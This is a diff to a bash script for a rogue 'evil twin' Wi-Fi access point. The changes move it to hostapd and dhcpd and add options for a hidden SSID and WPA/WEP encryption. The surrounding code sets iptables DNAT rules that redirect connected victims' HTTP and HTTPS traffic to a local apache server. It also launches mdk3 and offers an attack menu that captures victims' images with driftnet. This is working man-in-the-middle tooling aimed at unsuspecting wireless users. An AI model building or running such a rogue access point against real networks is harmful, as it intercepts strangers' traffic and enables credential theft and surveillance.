@@ -57,16 +57,25 @@ function hard_interrupt {
 		killall mdk3 &> /dev/null
 		sleep 3
 	fi
-	
-	echo -e "[${Red}x$Color_Off]Kill monitor mode"
-	STOP_MONITOR=$(airmon-ng stop $MON_INTERFACE > /dev/null)
 
-	
+	echo -e "[${Red}x$Color_Off]Turnoff broadcast"
+	killall hostapd &> /dev/null
+	sleep 2
+
+	echo -e "[${Red}x$Color_Off]Removing gateway"
+	ip addr del 10.0.0.1/24 dev $MON_INTERFACE
+	sleep 3
+
+	echo -e "[${Red}x$Color_Off]Kill monitor mode"
+	MON_INTERFACE_DOWN=$(ifconfig $MON_INTERFACE down > /dev/null)
+	STOP_MONITOR=$(airmon-ng stop $MON_INTERFACE > /dev/null)
+	sleep 2
+
 	echo -e "[${Red}x$Color_Off]turnning off all interfaces"
 	BROADCAST_INTERFACE_DOWN=$(ifconfig $BROADCAST_INTERFACE down > /dev/null)
 	ONLINE_INTERFACE_DOWN=$(ifconfig $ONLINE_INTERFACE down > /dev/null)
 
-	echo -e "[${Red}x${Color_Off}]Turnoff the broadcasting AP"
+	#echo -e "[${Red}x${Color_Off}]Turnoff the broadcasting AP"
 	#KILL_SIGNAL=$(ip addr del 10.0.0.1/24 brd + dev ap0)
 	#DELETE_INTERFACE=$(ip link delete ap0 type dummy)
 	#DELETE_MOD=$(rmmod dummy)
@@ -96,8 +105,12 @@ function hard_interrupt {
 
 
 	echo -e "[${Red}x${Color_Off}]Clearing the files"
-	WIPE_DNSMASQ=$(echo 0 > /etc/dnsmasq.conf)
+	WIPE_DHCP=$(echo 0 > /etc/dhcp/dhcpd.conf)
 	rm .* 2> /dev/null
+
+	killall hostapd 2> /dev/null
+	killall dhcpd 2> /dev/null
+
 
     
     echo -e "[${Blue}?${Color_Off}]Do you want to flush all iptables?(Y/N) ${Green}[Recommended]${Color_Off}"
@@ -231,20 +244,31 @@ function Informations {
 	echo $APNAME > .signalname
 	echo -e "\n[$Blue?$Color_Off]Choose an option: ${Green}[default = 1]${Color_Off}\n"
 	echo -e "[${Yellow}1${Color_Off}]Visible"
-	echo -e "[${Yellow}2${Color_Off}]Hidden ${Red}[Not working yet!]${Color_Off}"
-	## Add password Later ##
+	echo -e "[${Yellow}2${Color_Off}]Hidden"
 	header
 	read APOPTIONS
+	if [ $APOPTIONS ]; then
+		echo -e "\n[$Blue?$Color_Off]Choose wifi encryption type ${Green}[default = 1]${Color_Off}\n"
+		echo -e "[${Yellow}1${Color_Off}]Open - No encryption"
+		echo -e "[${Yellow}2${Color_Off}]WPA"
+		echo -e "[${Yellow}3${Color_Off}]WPA2"
+		echo -e "[${Yellow}4${Color_Off}]WPA/WPA2"
+		echo -e "[${Yellow}5${Color_Off}]WEP"
+		header
+		read AP_ENC
+		if [ $AP_ENC -eq 2 ] || [ $AP_ENC -eq 3 ] || [ $AP_ENC -eq 4 ]; then
+			echo -e "\n[$Blue?$Color_Off]Enter password key\n"
+			header
+			read WPA_PASS
+		fi
+	fi
 
 	DUAL_NIC=$(ip -o -4 route show to default | awk '{print $5}' | wc -l)
 	NAME_NIC=$(ip -o -4 route show to default | awk '{print $5}')
 
 
-	## TRY to view them in colorful way and choose it with number ##
-	## try to check if interface is in the list ##
-
-	if [ $DUAL_NIC -ge 2 ]
-		then ip -o -4 route show to default | awk '{print $5}' > .upinterfaces
+	if [[ $DUAL_NIC -ge 2 ]]; then 
+		ip -o -4 route show to default | awk '{print $5}' > .upinterfaces
 		NIC_1=$(sed '1q;d' .upinterfaces)
 		NIC_2=$(sed '2q;d' .upinterfaces)
 		NIC_3=$(sed '3q;d' .upinterfaces)
@@ -257,18 +281,16 @@ function Informations {
 		header
 		read BROADCAST_INTERFACE
 		
-		## NL80211 Check ##
 		printf "[${Blue}*${Color_Off}]Check NL80211 ${Red}"
-		NETWORK_CARD=$(ls /sys/class/$BROADCAST_INTERFACE/device/module/drivers/ | sed 's/usb://')
-		NL_SUPPORT=$(modinfo $NETWORK_CARD | grep mac80211 > /dev/null)
+								  	
+		WIFI_CARD_KERNEL_MODULE=$(ls /sys/class/net/$BROADCAST_INTERFACE/device/driver/module/drivers/ | sed 's/.*://')
+		NL_SUPPORT=$(modinfo $WIFI_CARD_KERNEL_MODULE | grep 'depend' | grep 'mac80211' > /dev/null)
 		
-		if [$? != 0]
-			then echo -e "\n${Color_Off}[${Red}x${Color_Off}]Your wireless card doesn't met the requirements to act as AccessPoint"
-			exit 1
-		else
-			printf "${Green}.. OK${Color_Off}\n"
+		if [[ $? == 0 ]];then printf "${Green}.. OK${Color_Off}\n"
+		
+		else printf "${Red}.. NOT SUPPORTED";echo -e "\n${Color_Off}[${Red}x${Color_Off}]Your wireless card doesn't met the requirements to act as AccessPoint";exit 1
+
 		fi
-		
 
 		echo -e "\n[${Blue}?${Color_Off}]Which interface you will use to provide the internet connection?"
 		header
@@ -304,20 +326,69 @@ function Informations {
 	echo -e "[${Green}+$Color_Off]System Distrbution     : $SYSTEM_DISTRO"
 
 }
+function dhcp_configuration {
 
-function configure_dnsmasq {
+	echo """ddns-update-style none;
+ignore client-updates;
+authoritative;
+option local-wpad code 252 = text;
+subnet
+10.0.0.0 netmask 255.255.255.0 {
 
-	echo "log-facility=/var/log/dnsmasq.log" > /etc/dnsmasq.conf
-	echo "interface=at0" >> /etc/dnsmasq.conf
-	echo "dhcp-range=10.0.0.10,10.0.0.250,12h" >> /etc/dnsmasq.conf
-	echo "dhcp-option=3,10.0.0.1" >> /etc/dnsmasq.conf
-	echo "dhcp-option=6,10.0.0.1" >> /etc/dnsmasq.conf
-	echo "server=8.8.8.8" >> /etc/dnsmasq.conf
-	echo "log-queries" >> /etc/dnsmasq.conf
-	echo "log-dhcp" >> /etc/dnsmasq.conf
-	## START ##
-	xterm -geometry 97x26-0+0 -fg "#00FF11" -bg "#000000" -title DNSRequests -e dnsmasq -C /etc/dnsmasq.conf -d &
+##--Default gateway--##
+option routers
+10.0.0.1;
 
+##--Netmask--##
+option subnet-mask
+255.255.255.0;
+
+##--Broadcast Address--##
+option broadcast-address
+10.0.0.255;
+
+##--Domain name servers--##
+option domain-name-servers
+10.0.0.1, 8.8.8.8, 8.8.4.4;
+option time-offset
+0;
+
+##--range--##
+range 10.0.0.3 10.0.0.100;
+default-lease-time 1209600;
+max-lease-time 1814400;
+}""" > /etc/dhcp/dhcpd.conf
+	dhcpd $MON_INTERFACE  2> /dev/null &
+}
+
+function ap_conf {
+	echo """interface=$MON_INTERFACE
+utf8_ssid=1
+ssid=$APNAME
+driver=nl80211
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1""" > /etc/hostapd/hostapd.conf
+	if [[ AP_ENC -eq 2 ]]; then
+		echo """wpa=1
+wpa_passphrase=$WPA_PASS
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP""" >> /etc/hostapd/hostapd.conf
+	elif [[ AP_ENC -eq 3 ]]; then
+		echo """wpa=2
+wpa_passphrase=$WPA_PASS
+rsn_pairwise=CCMP""" >> /etc/hostapd/hostapd.conf
+	elif [[ AP_ENC -eq 4 ]]; then
+		echo """wpa=3
+wpa_passphrase=$WPA_PASS
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP""" >> /etc/hostapd/hostapd.conf
+	elif [[ AP_ENC -eq 5 ]]; then
+		echo """wep_default_key=0
+wep_key0=qwert""" >> /etc/hostapd/hostapd.conf
+	fi
+	if [[ $APOPTIONS -eq 2 ]]; then echo "ignore_broadcast_ssid=1" >> /etc/hostapd/hostapd.conf;fi
 }
 
 function monitor_mode {
@@ -332,7 +403,7 @@ function monitor_mode {
 			exit 1
 	fi
 }
-
+################BROADCAST)))))))))))))
 function broadcast_ap {
 
 	MON_INTERFACE="$(ls /sys/class/net/ | grep mon)"
@@ -344,14 +415,12 @@ function broadcast_ap {
 			exit 1
 	fi
 
-	if [ $APOPTIONS = "1" ] || [ -z $APOPTIONS ]
-		then xterm -geometry 97x14-0-0 -fg "#FF4040" -bg "#000000" -title BroadcastingON -e airbase-ng -e "$APNAME" -c 6 $MON_INTERFACE &
-	## FIXME Can't hide the AP ##
-	elif [ $APOPTIONS = "2" ]
-		then xterm -geometry 97x14-0-0 -fg "#FF4040" -bg "#000000" -title BroadcastingON -e airbase-ng -e "$APNAME" -c 6 -X $MON_INTERFACE &
-	else
-		xterm -geometry 97x14-0-0 -fg "#FF4040" -bg "#000000" -title BroadcastingON -e airbase-ng -e "$APNAME" -c 6 $MON_INTERFACE &
+	if [ $APOPTIONS ]; then
+		ap_conf
+		sleep 3
+		hostapd -B /etc/hostapd/hostapd.conf > /dev/null &
 	fi
+
 }
 
 function set_ips {
@@ -362,9 +431,9 @@ function set_ips {
 	NETMASK="255.255.255.0"
 	GATEWAY="10.0.0.1"
 
-	ifconfig at0 $GATEWAY/24 up
+	ip a a $GATEWAY/24 dev $MON_INTERFACE
 	if [ $? != 0 ]
-		then echo -e "[${Red}x${Color_Off}]Can't set at0 interface!"
+		then echo -e "[${Red}x${Color_Off}]Can't set $MON_INTERFACE interface!"
 	fi
 	route add -net $IP_NETWORK netmask $NETMASK gw $GATEWAY
 	echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -375,7 +444,7 @@ function set_ips {
 function redirecting_start {
 	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
 	echo -e "[${Blue}*${Color_Off}]Redirecting http requests"
-	iptables --append FORWARD --in-interface at0 -j ACCEPT
+	iptables --append FORWARD --in-interface $MON_INTERFACE -j ACCEPT
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80
 	echo -e "[${Blue}*${Color_Off}]Redirecting https requests"
 	iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j DNAT --to-destination $HOST_IP:443
@@ -421,7 +490,7 @@ function redirecting_start {
 	if [ $? != 0 ]
 		then echo -e "[${Red}x${Color_Off}]Faild to start apache server!"
 		echo -e "[${Red}!${Color_Off}]Fall back.."
-		iptables -D FORWARD --in-interface at0 -j ACCEPT
+		iptables -D FORWARD --in-interface $MON_INTERFACE -j ACCEPT
 		iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80
 		iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j DNAT --to-destination $HOST_IP:443
 		iptables -D INPUT -p tcp --source-port 443 -j ACCEPT
@@ -437,7 +506,7 @@ function redirecting_start {
 function redirecting_stop {
 	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
 	echo -e "[${Red}*${Color_Off}]Reset the redirection rules.."
-	iptables -D FORWARD --in-interface at0 -j ACCEPT 2> /dev/null
+	iptables -D FORWARD --in-interface $MON_INTERFACE -j ACCEPT 2> /dev/null
 	iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80 2> /dev/null
 	iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j DNAT --to-destination $HOST_IP:443 2> /dev/null
 	iptables -D INPUT -p tcp --source-port 443 -j ACCEPT 2> /dev/null
@@ -619,7 +688,7 @@ function attack_options {
 		read ATTACKOPTION
 		if [ $ATTACKOPTION = 1 ]
 	    	then echo -e "\n[${Green}+${Color_Off}]Get images.."
-	    	driftnet -i at0 2> /dev/null &
+	    	driftnet -i $MON_INTERFACE 2> /dev/null &
 			sleep 3
 		
 		elif [ $ATTACKOPTION = 2 ]
@@ -743,8 +812,8 @@ function main {
 		sleep 3
 
 		#Configure dnsmasq
-		echo -e "[$BBlue*$Color_Off]Enable dnsmasq"
-		configure_dnsmasq
+		echo -e "[$BBlue*$Color_Off]Enable DHCP Server"
+		dhcp_configuration
 
 
 		#Done
